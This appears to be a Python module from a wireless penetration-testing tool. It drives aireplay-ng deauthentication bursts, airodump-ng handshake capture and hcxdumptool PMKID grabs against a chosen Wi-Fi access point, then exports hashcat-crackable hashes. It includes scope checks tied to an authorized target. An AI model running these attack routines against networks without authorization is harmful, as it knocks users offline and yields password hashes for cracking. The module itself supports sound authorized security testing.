"""Targeted capture: lock the radio to one AP, deauth, grab the handshake.

Flow this module supports (all standard aircrack-ng suite usage):
  1. start a capture pinned to the target BSSID + channel (airodump-ng -> .cap)
  2. send a *small, targeted* burst of deauth frames (aireplay-ng) to nudge a
     client into reconnecting so the 4-way handshake is re-sent
  3. verify the .cap actually contains a handshake (aircrack-ng)
  4. optionally export to hashcat 22000 format (hcxpcapngtool)

Deauth defaults are deliberately low (a few frames at a specific client) — the
goal is to catch a reconnect, not to hold anyone offline.
"""

from __future__ import annotations

import glob
import os
import re
import subprocess
import tempfile
from dataclasses import dataclass
from datetime import datetime
from typing import Optional

from .util import CmdResult, LogFn, is_mac, run, spawn, terminate, which


def _stamp() -> str:
    """A filename-safe timestamp so re-running against one AP never overwrites."""
    return datetime.now().strftime("%Y%m%d-%H%M%S")


@dataclass
class CaptureTarget:
    bssid: str
    channel: str
    essid: str = ""


def is_valid_channel(channel: str) -> bool:
    """A capture must pin to a real channel; airodump rejects unknown/negative."""
    try:
        return int(str(channel)) > 0
    except (TypeError, ValueError):
        return False


def safe_prefix(out_dir: str, essid: str, bssid: str) -> str:
    """Filesystem-safe capture prefix from a (possibly messy) ESSID + BSSID."""
    safe_essid = re.sub(r"[^A-Za-z0-9_-]+", "_", essid or "target").strip("_") or "target"
    return os.path.join(out_dir, f"{safe_essid}_{bssid.replace(':', '')}")


def capture_argv(mon_iface: str, bssid: str, channel: str, prefix: str) -> list:
    """airodump-ng argv for a capture pinned to one AP's channel + BSSID.

    `--output-format pcap` keeps airodump from also spewing .csv/.kismet.csv/
    .kismet.netxml/.log.csv beside every capture.
    """
    return [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "--output-format", "pcap",
        "-w", prefix,
        mon_iface,
    ]


def deauth_argv(mon_iface: str, bssid: str, client: Optional[str], count: int) -> list:
    """aireplay-ng argv for a targeted (or broadcast) deauth burst."""
    argv = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        argv += ["-c", client]
    argv.append(mon_iface)
    return argv


def injection_test(mon_iface: str, log: Optional[LogFn] = None) -> bool:
    """Run `aireplay-ng --test` to confirm the adapter can actually inject.

    A card that scans fine but can't inject will never capture a handshake, so
    this is worth checking before blaming the target.
    """
    res = run(["aireplay-ng", "--test", mon_iface], timeout=25, log=log)
    ok = "injection is working" in res.text().lower()
    if log:
        log("Injection is working." if ok else "Injection test did NOT confirm working injection.")
    return ok


class CaptureSession:
    """Owns the pinned airodump-ng capture process and its output files."""

    def __init__(self, mon_iface: str, target: CaptureTarget, out_dir: Optional[str] = None,
                 log: Optional[LogFn] = None):
        self.mon_iface = mon_iface
        self.target = target
        self.log = log
        self._proc: Optional[subprocess.Popen] = None
        self._logfh = None
        self._logpath: Optional[str] = None
        self.out_dir = out_dir or tempfile.mkdtemp(prefix="providence-cap-")
        os.makedirs(self.out_dir, exist_ok=True)
        self.prefix = safe_prefix(self.out_dir, target.essid, target.bssid) + "_" + _stamp()

    # -- capture -----------------------------------------------------------
    def start(self) -> None:
        """Begin capturing, locked to the target's channel and BSSID."""
        if not is_mac(self.target.bssid) or not is_valid_channel(self.target.channel):
            if self.log:
                self.log(f"Refusing capture: bad target {self.target.bssid!r} / channel "
                         f"{self.target.channel!r}")
            return
        self._logpath = self.prefix + ".airodump.log"
        self._logfh = open(self._logpath, "w")
        self._proc = spawn(
            capture_argv(self.mon_iface, self.target.bssid, self.target.channel, self.prefix),
            log=self.log, out=self._logfh, tty=True,
        )
        if self.log:
            self.log(f"Capturing {self.target.essid or self.target.bssid} on channel {self.target.channel}")

    def running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def stop(self) -> None:
        terminate(self._proc, log=self.log)
        self._proc = None
        if self._logfh:
            try:
                self._logfh.close()
            except OSError:
                pass
            self._logfh = None

    def log_tail(self, n: int = 8) -> str:
        if not self._logpath or not os.path.exists(self._logpath):
            return ""
        try:
            with open(self._logpath, "r", errors="replace") as f:
                return "\n".join(f.read().splitlines()[-n:])
        except OSError:
            return ""

    def cap_file(self) -> Optional[str]:
        """Newest .cap file this session has produced (by mtime, not name)."""
        files = glob.glob(self.prefix + "*.cap")
        if not files:
            return None
        return max(files, key=lambda p: os.path.getmtime(p))

    # -- deauth ------------------------------------------------------------
    def deauth(self, client: Optional[str] = None, count: int = 5) -> CmdResult:
        """Send a small burst of deauth frames.

        If `client` is given, the deauth is directed at that station (quietest,
        most effective for catching one reconnect). Otherwise it's broadcast to
        the AP. `count` frames are sent and aireplay exits (count=0 would loop
        forever — intentionally not the default).
        """
        if not is_mac(self.target.bssid):
            return CmdResult(["aireplay-ng"], 2, "", f"refusing deauth: bad BSSID {self.target.bssid!r}",
                             0.0, 0.0)
        if client and not is_mac(client):
            if self.log:
                self.log(f"Ignoring malformed client MAC {client!r}; broadcasting instead.")
            client = None
        who = client or "broadcast"
        if self.log:
            self.log(f"Deauth x{count} at {who} on {self.target.bssid}")
        return run(deauth_argv(self.mon_iface, self.target.bssid, client, count), timeout=30, log=self.log)

    # -- verify ------------------------------------------------------------
    def has_handshake(self, quiet: bool = False) -> bool:
        cap = self.cap_file()
        if not cap:
            return False
        # quiet=True (used by the 5s auto-poll) suppresses the per-check command
        # + result spam so the activity log doesn't fill with routine polls.
        return verify_handshake(cap, self.target.bssid, log=(None if quiet else self.log))

    # -- export ------------------------------------------------------------
    def export_22000(self) -> Optional[str]:
        cap = self.cap_file()
        if not cap:
            return None
        return export_hashcat(cap, log=self.log)


def _scan_handshake_text(text: str, bssid: str = "") -> bool:
    """Pure parser: does aircrack-ng's output claim a handshake?

    aircrack lists each network with a "(N handshake)" marker. Any N>=1 counts;
    when a target BSSID is given the marker must be on that BSSID's row, so a
    handshake for a different network in the same .cap isn't a false positive.
    """
    target = bssid.lower()
    for line in text.splitlines():
        low = line.lower()
        if "handshake" not in low or "(0 handshake" in low or "no valid" in low:
            continue
        if not target:
            return True
        # Anchor the match to the real BSSID *column* (token 2 of an aircrack row:
        # "<idx> <BSSID> <ESSID...> <enc> (N handshake)"), so a hostile ESSID that
        # merely CONTAINS the target's BSSID text can't forge a positive.
        toks = line.split()
        if len(toks) >= 2 and is_mac(toks[1]) and toks[1].lower() == target:
            return True
    return False


def verify_handshake(cap_file: str, bssid: str = "", log: Optional[LogFn] = None) -> bool:
    """Return True if aircrack-ng reports a WPA handshake in the capture.

    `aircrack-ng file.cap` prints a table of networks; a captured handshake is
    flagged as "(1 handshake)" next to the ESSID.
    """
    if not cap_file or not os.path.exists(cap_file):
        return False
    # input_text="" closes stdin: if the .cap holds several BSSIDs, aircrack-ng
    # would otherwise prompt "Index number of target network?" and block until
    # our timeout. With stdin at EOF it prints the network table and exits.
    res = run(["aircrack-ng", cap_file], timeout=30, input_text="", log=log)
    found = _scan_handshake_text(res.text(), bssid)
    if log:
        log("Handshake present." if found else "No handshake captured yet.")
    return found


def _scope_22000_file(path: str, bssid: str) -> None:
    """Rewrite a 22000 file keeping only lines whose AP MAC is `bssid`.

    A PMKID/EAPOL 22000 line is WPA*NN*<hash>*<ap-mac>*<sta-mac>*... — field 3
    is the AP MAC. Passive capture can pick up co-channel neighbours, so we drop
    anything not for the authorized target before it's handed off. Empty result
    removes the file.
    """
    target = bssid.replace(":", "").lower()
    try:
        with open(path, "r", errors="replace") as f:
            lines = f.read().splitlines()
    except OSError:
        return
    kept = []
    for line in lines:
        parts = line.split("*")
        if line.startswith("WPA*") and len(parts) >= 4 and parts[3].lower() != target:
            continue
        if line.strip():
            kept.append(line)
    if kept:
        with open(path, "w") as f:
            f.write("\n".join(kept) + "\n")
    elif os.path.exists(path):
        os.remove(path)


def export_hashcat(cap_file: str, out_file: Optional[str] = None, log: Optional[LogFn] = None,
                   bssid: str = "") -> Optional[str]:
    """Convert a .cap/.pcapng to hashcat's 22000 format via hcxpcapngtool.

    Returns the output path on success, else None. If `bssid` is given, the
    result is scoped to that AP's rows (used for PMKID, whose raw pcapng may hold
    co-channel neighbours; the airodump .cap is already BSSID-scoped so callers
    leave bssid empty there).
    """
    if which("hcxpcapngtool") is None:
        if log:
            log("hcxpcapngtool not installed; skipping 22000 export (apt install hcxtools).")
        return None
    if not cap_file or not os.path.exists(cap_file):
        return None
    out_file = out_file or (os.path.splitext(cap_file)[0] + ".22000")
    res = run(["hcxpcapngtool", "-o", out_file, cap_file], timeout=60, log=log)
    if res.ok and os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        if bssid:
            _scope_22000_file(out_file, bssid)
        if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
            if log:
                log(f"Exported hashcat 22000: {out_file}")
            return out_file
        if log:
            log("No in-scope hashes for the target BSSID.")
        return None
    if log:
        log("Export produced no usable hashes (handshake may be incomplete).")
    return None


# ----------------------------------------------------------------- PMKID
def hcxdumptool_version(log: Optional[LogFn] = None) -> Optional[tuple]:
    """Return the installed hcxdumptool (major, minor), or None if absent/unknown.

    The 6.3.0 rewrite (shipping in current Kali) removed the --filterlist_ap /
    --filtermode attack-filter interface, so we must know the version before
    building the command or it exits on an unrecognized option.
    """
    if which("hcxdumptool") is None:
        return None
    res = run(["hcxdumptool", "--version"], timeout=10, log=None)
    m = re.search(r"(\d+)\.(\d+)", res.text())
    return (int(m.group(1)), int(m.group(2))) if m else None


def pmkid_detection_available() -> bool:
    """PMKID success is detected by converting with hcxpcapngtool; without it we
    can capture but never see a green light or export."""
    return which("hcxpcapngtool") is not None


def hcxdumptool_argv(iface: str, out_pcapng: str, channel: Optional[str] = None,
                     filter_file: Optional[str] = None, version: Optional[tuple] = None,
                     bpf_file: Optional[str] = None) -> list:
    """Build an hcxdumptool command for clientless (PMKID) capture.

    `--filterlist_ap`/`--filtermode` (target whitelist) exist ONLY on the
    6.0–6.2 line; 6.3+ removed them (an unknown option makes hcxdumptool exit).
    So those flags are added only when the detected `version` is <= 6.2. On 6.3+
    (or unknown) we omit them and rely on target-scoped detection + export
    instead, so nothing out-of-scope is ever reported or handed off. The exact
    command is echoed to the log so it can be adjusted per installed version.
    """
    argv = ["hcxdumptool", "-i", iface, "-w", out_pcapng]
    if channel:
        argv += ["-c", str(channel)]
    if version is not None and version < (6, 3):
        # 6.0-6.2: AP whitelist keeps the active attack on the target only.
        if filter_file:
            argv += ["--filterlist_ap=" + filter_file, "--filtermode=2"]
    else:
        # 6.3+ removed those flags; RF-scope with a compiled BPF instead.
        if bpf_file:
            argv += ["--bpf=" + bpf_file]
    return argv


def pmkid_from_22000(text: str) -> bool:
    """hcxpcapngtool writes 22000 lines: WPA*01* = PMKID, WPA*02* = EAPOL."""
    return "WPA*01*" in text


def pmkid_for_bssid(text: str, bssid: str = "") -> bool:
    """True if a PMKID line (WPA*01*<pmkid>*<ap-mac>*...) is for `bssid`.

    Scopes success detection to the authorized target so a co-channel
    neighbour's PMKID isn't reported as ours. Empty bssid = any PMKID.
    """
    target = bssid.replace(":", "").lower()
    for line in text.splitlines():
        if line.startswith("WPA*01*"):
            parts = line.split("*")
            if len(parts) >= 4 and (not target or parts[3].lower() == target):
                return True
    return False


def hash_kinds(text: str) -> set:
    """Which crackable material a 22000 blob contains: {'PMKID','EAPOL'}."""
    kinds = set()
    if "WPA*01*" in text:
        kinds.add("PMKID")
    if "WPA*02*" in text:
        kinds.add("EAPOL")
    return kinds


class PmkidSession:
    """Clientless PMKID capture via hcxdumptool (no deauth needed).

    Many WPA2 APs hand out a PMKID in the first EAPOL message, so a PMKID can
    often be grabbed without any connected client and without deauthing anyone.
    """

    def __init__(self, mon_iface: str, target: CaptureTarget, out_dir: Optional[str] = None,
                 log: Optional[LogFn] = None):
        self.mon_iface = mon_iface
        self.target = target
        self.log = log
        self._proc: Optional[subprocess.Popen] = None
        self._logfh = None
        self._logpath: Optional[str] = None
        self.out_dir = out_dir or tempfile.mkdtemp(prefix="providence-pmkid-")
        os.makedirs(self.out_dir, exist_ok=True)
        base = safe_prefix(self.out_dir, target.essid, target.bssid) + "_" + _stamp()
        self.pcapng = base + ".pcapng"
        self._filter_file = base + ".filter"

    def start(self) -> None:
        # Scope enforcement: never run PMKID capture unscoped (it would probe
        # every AP on the channel, outside the authorized target).
        if not is_mac(self.target.bssid):
            if self.log:
                self.log(f"Refusing PMKID capture: no valid target BSSID ({self.target.bssid!r}).")
            return
        try:
            with open(self._filter_file, "w") as f:
                f.write(self.target.bssid.replace(":", "").lower() + "\n")
        except OSError as e:
            if self.log:
                self.log(f"Could not write PMKID target filter: {e}")
            return
        chan = self.target.channel if is_valid_channel(self.target.channel) else None
        ver = hcxdumptool_version(log=self.log)
        bpf_file = None
        if ver is None or ver >= (6, 3):
            # 6.3+ removed the AP whitelist. RF-scope via a compiled BPF, or REFUSE:
            # never run an unscoped active PMKID attack across the whole channel
            # (that would probe APs outside the authorized target).
            bpf_file = self._build_bpf()
            if not bpf_file:
                if self.log:
                    self.log("Refusing PMKID: hcxdumptool 6.3+ can't be RF-scoped to the target "
                             "without a BPF filter (needs tcpdump). Install tcpdump, or use the "
                             "handshake path (which is BSSID-scoped by airodump).")
                return
        self._logpath = self.pcapng + ".log"
        self._logfh = open(self._logpath, "w")
        self._proc = spawn(hcxdumptool_argv(self.mon_iface, self.pcapng, chan, self._filter_file, ver, bpf_file),
                           log=self.log, out=self._logfh, tty=True)
        if self.log:
            vtxt = f"{ver[0]}.{ver[1]}" if ver else "unknown"
            scope = "BPF-scoped" if bpf_file else "AP-whitelist scoped"
            self.log(f"PMKID capture on {self.mon_iface} (hcxdumptool {vtxt}, {scope}) targeting "
                     f"{self.target.bssid} -> {os.path.basename(self.pcapng)}")

    def _build_bpf(self) -> Optional[str]:
        """Compile a Berkeley Packet Filter restricting capture to the target
        BSSID (for hcxdumptool 6.3+ which dropped --filterlist_ap). Returns the
        BPF file path, or None if tcpdump is unavailable / compilation failed."""
        if which("tcpdump") is None:
            return None
        b = self.target.bssid
        if not is_mac(b):
            return None
        expr = f"wlan addr1 {b} or wlan addr2 {b} or wlan addr3 {b}"
        res = run(["tcpdump", "-y", "IEEE802_11_RADIO", "-ddd", expr], timeout=15, log=self.log)
        if not res.ok or not res.out.strip():
            return None
        bpf = self.pcapng + ".bpf"
        try:
            with open(bpf, "w") as f:
                f.write(res.out)
        except OSError:
            return None
        return bpf

    def running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def stop(self) -> None:
        terminate(self._proc, log=self.log)
        self._proc = None
        if self._logfh:
            try:
                self._logfh.close()
            except OSError:
                pass
            self._logfh = None

    def log_tail(self, n: int = 8) -> str:
        if not self._logpath or not os.path.exists(self._logpath):
            return ""
        try:
            with open(self._logpath, "r", errors="replace") as f:
                return "\n".join(f.read().splitlines()[-n:])
        except OSError:
            return ""

    def cap_file(self) -> Optional[str]:
        return self.pcapng if os.path.exists(self.pcapng) else None

    def export_22000(self) -> Optional[str]:
        if not os.path.exists(self.pcapng):
            return None
        return export_hashcat(self.pcapng, log=self.log, bssid=self.target.bssid)

    def check_pmkid(self, quiet: bool = False) -> bool:
        """Convert the pcapng and report whether a PMKID was captured for the
        target BSSID. quiet=True (auto-poll) suppresses routine log spam."""
        log = None if quiet else self.log
        out = (export_hashcat(self.pcapng, log=log, bssid=self.target.bssid)
               if os.path.exists(self.pcapng) else None)
        if not out:
            return False
        try:
            with open(out, "r", errors="replace") as f:
                text = f.read()
        except OSError:
            return False
        found = pmkid_for_bssid(text, self.target.bssid)
        if not quiet and self.log:
            self.log("PMKID captured." if found else "No PMKID yet.")
        return found
